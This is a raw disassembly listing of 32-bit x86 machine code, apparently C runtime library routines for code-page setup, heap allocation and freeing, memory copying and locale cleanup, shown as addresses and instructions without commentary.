  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
